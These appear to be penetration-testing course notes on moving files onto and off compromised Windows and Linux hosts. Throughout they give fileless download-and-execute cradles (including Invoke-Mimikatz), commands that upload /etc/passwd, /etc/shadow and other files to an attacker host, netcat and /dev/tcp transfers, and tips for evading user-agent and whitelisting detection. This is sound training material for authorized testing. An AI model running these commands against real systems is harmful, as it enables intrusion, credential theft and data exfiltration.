# File Transfers

Host controls (application whitelisting, AV/EDR) and network controls (firewall, IDS/IPS) decide which transfer method survives — always have fallbacks.

The module's opening scenario as a chain of fallbacks: RCE on IIS → PowerShell blocked by Application Control Policy → Certutil pull from own GitHub blocked by web content filtering → FTP blocked (outbound TCP/21) → impacket smbserver over TCP/445 allowed → PrintSpoofer binary landed, SeImpersonatePrivilege escalated to admin.

## Windows File Transfer Methods

### Introduction

Astaroth APT as a fileless transfer chain: phish LNK → WMIC `/Format` downloads+runs JS → Bitsadmin pulls payloads → Certutil base64-decodes them into DLLs → regsvr32 loads them → final payload injected into Userinit. Fileless ≠ no transfer — the payload still moves, just in memory.

### Download Operations

#### PowerShell Base64 Encode & Decode

No network needed — encode, paste into the terminal, decode. Verify hashes on both ends.

```bash
md5sum id_rsa                     # source hash
cat id_rsa | base64 -w 0; echo    # one line, easy to copy
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5   # must match source
```

Limits: cmd.exe max string length 8191 chars; web shells may error on very large strings.

#### PowerShell Web Downloads

HTTP/HTTPS outbound is usually allowed, but web filtering can block categories, file types (.exe), or anything off the domain whitelist.

`Net.WebClient` works in any PowerShell version:

```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
(New-Object Net.WebClient).DownloadFileAsync('<TARGET_FILE_URL>','<OUTPUT_FILE_NAME>')

# fileless — run straight from memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX   # pipeline form
```

Invoke-WebRequest (PS 3.0+), noticeably slower; aliases `iwr` / `curl` / `wget`:

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

harmj0y's PowerShell download-cradle list is worth knowing — pick by proxy awareness and whether it touches disk.

Two common errors and their fixes:

```powershell
# IE first-launch config incomplete → parse error
Invoke-WebRequest https://<ATTACKER_IP>/PowerView.ps1 -UseBasicParsing | IEX

# untrusted cert → SSL/TLS secure channel error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### SMB Downloads

TCP/445 is commonly allowed inside enterprise networks.

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

```cmd
copy \\<ATTACKER_IP>\share\nc.exe
```

Newer Windows blocks unauthenticated guest access → add creds to the server and mount the share:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
net use n: \\<ATTACKER_IP>\share /user:test test
copy n:\nc.exe
```

#### FTP Downloads

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21    # default port is 2121; anonymous auth enabled by default
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Non-interactive shell → FTP command file:

```cmd
echo open <ATTACKER_IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Upload Operations

#### PowerShell Base64 Encode & Decode

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

```bash
echo <base64> | base64 -d > hosts
md5sum hosts    # compare hashes
```

#### PowerShell Web Uploads

PowerShell has no built-in upload function. Stand up uploadserver (Python http.server extended with an upload page at `/upload`), then use PSUpload.ps1 or a raw POST:

```bash
pip3 install uploadserver
python3 -m uploadserver
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

base64 over POST, caught with Netcat:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
```

```bash
nc -lvnp 8000          # base64 arrives in the POST body
echo <base64> | base64 -d > hosts
```

#### SMB Uploads

Outbound SMB (TCP/445) is often blocked leaving the network. WebDAV runs SMB over HTTP(S) instead — Windows attempts SMB first, then falls back to HTTP.

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
dir \\<ATTACKER_IP>\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\<ATTACKER_IP>\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\<ATTACKER_IP>\sharefolder\
```

`DavWWWRoot` is a Windows Shell keyword for the WebDAV server root — no such folder exists server-side. Targeting a real folder name (second copy above) avoids it.
If TCP/445 isn't filtered, impacket-smbserver works for uploads same as downloads.

#### FTP Uploads

```bash
sudo python3 -m pyftpdlib --port 21 --write   # --write lets clients upload (pyftpdlib warns: anonymous write)
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Command-file variant: identical to the download one but with `echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt`.

## Linux File Transfer Methods

Real-world dropper seen on an IR engagement tried three methods in order, all over HTTP: cURL → wget → Python. HTTP/HTTPS is the most likely outbound path on any OS.

### Download Operations

#### Base64 Encoding / Decoding

Same trick as on Windows, no network required.

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
echo -n '<base64>' | base64 -d > id_rsa
md5sum id_rsa
```

Reverse direction for exfil: cat + base64 on the target, decode in Pwnbox.

#### Web Downloads with Wget and cURL

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh   # -O sets output name
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh   # lowercase -o
```

#### Fileless Attacks Using Linux

Pipes make most Linux tools fileless:

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

Caveat: some payloads (mkfifo) still create temp files on disk even when execution is piped.

#### Download with Bash (/dev/tcp)

No transfer tools at all? Bash ≥2.04 (compiled with `--enable-net-redirections`) has the /dev/tcp pseudo-device:

```bash
exec 3<>/dev/tcp/<ATTACKER_IP>/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3
```

#### SSH Downloads

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
netstat -lnpt    # confirm 22 is listening

scp <USERNAME>@<ATTACKER_IP>:/root/myroot.txt .
```

Use a throwaway account for transfers — don't put primary credentials or keys on a compromised box.

### Upload Operations

#### Web Upload

uploadserver over HTTPS with a self-signed cert:

```bash
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https    # don't host the cert inside the webroot
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash
curl -X POST https://<ATTACKER_IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

`--insecure` because the cert is self-signed (and trusted by us).

#### Alternative Web File Transfer Method

If the compromised box is (or has) a web server, move the file into the webroot and just download it from the Pwnbox. Mini web servers are flexible on webroot and port:

```bash
python3 -m http.server
python2.7 -m SimpleHTTPServer
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

```bash
wget <TARGET_IP>:8000/filetotransfer.txt
```

This is a download from the target, not an upload — inbound traffic to the target may still be blocked.

#### SCP Upload

Outbound SSH (TCP/22) allowed? scp works both ways; syntax like cp:

```bash
scp /etc/passwd <USERNAME>@<TARGET_IP>:/home/htb-student/
```

## Transferring Files with Code

Interpreters are a fallback when the usual binaries are missing. Python/PHP/Perl/Ruby are common on Linux; Windows has cscript/mshta for JavaScript and VBScript.

### Python

```bash
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### PHP

```bash
# file_get_contents + file_put_contents
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# fopen/fread stream copy
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# fileless — echo lines straight into bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

`@file()` accepts a URL as filename if fopen wrappers are enabled.

### Other Languages

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### JavaScript

Save as wget.js:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

### VBScript

Save as wget.vbs:

```text
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### Upload Operations using Python3

```bash
python3 -m uploadserver    # on the attack host

python3 -c 'import requests;requests.post("http://<ATTACKER_IP>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## Miscellaneous File Transfer Methods

### Netcat

Either side can initiate the connection — handy when a firewall blocks inbound to the target. Ncat ships in Pwnbox as `nc`, `ncat`, and `netcat`. Ncat closes cleanly with `--send-only`/`--recv-only`; original netcat uses `-q 0`.

Victim listens, attacker pushes:

```bash
# compromised host
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe

# attack host
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 <TARGET_IP> 8000 < SharpKatz.exe
ncat --send-only <TARGET_IP> 8000 < SharpKatz.exe
```

Attacker listens on 443 instead — for when inbound connections to the target are blocked:

```bash
# attack host
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe

# compromised host
nc <ATTACKER_IP> 443 > SharpKatz.exe
ncat <ATTACKER_IP> 443 --recv-only > SharpKatz.exe

# no netcat on the victim at all → bash /dev/tcp
cat < /dev/tcp/<ATTACKER_IP>/443 > SharpKatz.exe
```

Same patterns reverse to pull files from the compromised host back to the Pwnbox.

### PowerShell Session File Transfer

When HTTP, HTTPS, and SMB are all unavailable — PowerShell Remoting (WinRM): TCP/5985 HTTP, TCP/5986 HTTPS. Requires admin rights, membership in Remote Management Users, or explicit session-configuration permissions.

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985

$Session = New-PSSession -ComputerName DATABASE01

Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP

Clipboard copy-paste works from Windows mstsc; with xfreerdp/rdesktop it's unreliable. More consistent: mount a local folder into the session and reach it at `\\tsclient\`.

```bash
rdesktop <TARGET_IP> -d <DOMAIN> -u administrator -p '<PASSWORD>' -r disk:linux='/home/user/rdesktop/files'
xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:administrator /p:'<PASSWORD>' /drive:linux,/home/user/htb/academy/filetransfer
```

The mounted drive is visible only inside your own RDP session — other users on the box can't reach it even by hijacking the session.

## Protected File Transfers

Loot like NTDS.dit, credentials, and enumeration data should move over SSH/SFTP/HTTPS, or be encrypted before transfer — a plaintext transfer of sensitive data is exactly what an IDS will flag. Unless the client asked, don't exfil real PII/financial/trade-secret data; to test DLP controls, use dummy files that mimic the protected data instead.

### File Encryption on Windows

Invoke-AESEncryption.ps1 — small script, encrypts strings and files:

```powershell
Import-Module .\Invoke-AESEncryption.ps1

Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Text "Secret Text"        # → base64 ciphertext
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Text "<base64 ciphertext>"

Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt   # → scan-results.txt.aes
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path file.bin.aes         # → original file
```

Unique strong key per client — one leaked/cracked password shouldn't decrypt every engagement's files.

### File Encryption on Linux

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

`-iter` overrides default iteration count, `-pbkdf2` selects the key derivation function. Transfer the .enc file by any method; HTTPS/SFTP/SSH still preferred.

## Catching Files over HTTP/S

HTTP/S is the most firewall-friendly catch method and usually encrypts in transit — no client asking why a password went to our server in plaintext.

### Nginx - Enabling PUT

Nginx over Apache here: simpler config, and none of Apache's PHP-module footguns (executing an uploaded web shell). When allowing HTTP uploads, be certain nothing uploaded can execute.

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

`/etc/nginx/sites-available/upload.conf`:

```nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
```

Errors → `tail /var/log/nginx/error.log`. On Pwnbox, port 80 is already taken (websockify) — check with `ss -lnpt | grep 80`, then drop the default site that binds it:

```bash
sudo rm /etc/nginx/sites-enabled/default
```

Upload and verify:

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

Finally confirm directory listing is off at `http://localhost/SecretUploadDirectory` — Nginx doesn't enable it by default; Apache lists any directory lacking an index file, which is bad when exfil files are sensitive by nature.

## Living off The Land

LOLBAS (Windows binaries) and GTFOBins (Linux binaries) catalog binaries usable beyond their purpose: download, upload, command execution, file read, file write, bypasses.

### Using the LOLBAS and GTFOBins Project

Search LOLBAS by `/download` and `/upload`; GTFOBins by `+file download` / `+file upload`.

### LOLBAS

certreq.exe POSTs a local file to a URL — exfil into a Netcat listener:

```cmd
certreq.exe -Post -config http://<ATTACKER_IP>:8000/ c:\windows\win.ini
```

```bash
sudo nc -lvnp 8000   # file contents arrive in the POST body, copy-paste them out
```

certreq times out client-side but the POST still lands. Older certreq versions lack `-Post` entirely.

### GTFOBins

OpenSSL as an nc-style encrypted transport. Pwnbox side:

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Compromised host:

```bash
openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
```

### Other Common Living off the Land tools

```powershell
bitsadmin /transfer wcb /priority foreground http://<ATTACKER_IP>:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

# PowerShell BITS wrapper — supports credentials and proxies
Import-Module bitstransfer; Start-BitsTransfer -Source "http://<ATTACKER_IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

```cmd
certutil.exe -verifyctl -split -f http://<ATTACKER_IP>:8000/nc.exe
```

certutil exists on every Windows version and was the de facto wget — but AMSI now flags this usage as malicious.

## Detection

Command-line blacklists are trivially bypassed (even case obfuscation); whitelisting every legitimate command line is slow to build but catches anything out of the ordinary.

User agents are the other tell — anything speaking HTTP has one, not just browsers (curl, sqlmap, Nmap, custom scripts). Defenders feed known-good UAs into a SIEM and hunt the anomalies. Know what each technique leaks:

- Invoke-WebRequest / Invoke-RestMethod → `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0`
- WinHttpRequest COM → `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)`
- Msxml2 COM → `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)` — looks like real IE
- certutil (`-urlcache` and `-verifyctl`) → `Microsoft-CryptoAPI/10.0`
- BITS → `Microsoft BITS/7.8`, and it sends a HEAD request first

The COM cradles themselves — fileless, no PowerShell download cmdlets involved:

```powershell
# WinHttpRequest
$h = new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://<ATTACKER_IP>/nc.exe',$false);
$h.send();
iex $h.ResponseText

# Msxml2
$h = New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://<ATTACKER_IP>/nc.exe',$false);
$h.send();
iex $h.responseText
```

BITS in fileless style — download to temp, execute, remove:

```powershell
Import-Module bitstransfer;
Start-BitsTransfer 'http://<ATTACKER_IP>/nc.exe' $env:temp\t;
$r = gc $env:temp\t;
rm $env:temp\t;
iex $r
```

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>/nc.exe
certutil -verifyctl -split -f http://<ATTACKER_IP>/nc.exe
```

## Evading Detection

### Changing User Agent

If defenders blacklist these UAs, Invoke-WebRequest accepts a `-UserAgent` emulating IE, Firefox, Chrome, Opera, or Safari:

```powershell
# enumerate the available agents
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ATTACKER_IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

Match the environment — Chrome UA inside a Chrome shop reads as legitimate.

### LOLBAS / GTFOBins

App whitelisting blocking PowerShell and Netcat, command-line logging watching? A LOLBIN may be whitelisted and alert-exempt. Example: Intel Graphics Driver's GfxDownloadWrapper.exe (downloads config files by design) on systems that have it:

```powershell
GfxDownloadWrapper.exe "http://<ATTACKER_IP>/mimikatz.exe" "C:\Temp\nc.exe"
```

Find a download/upload binary that actually exists in the target environment via LOLBAS — GTFOBins lists ~40 commonly installed Linux binaries usable for file transfers.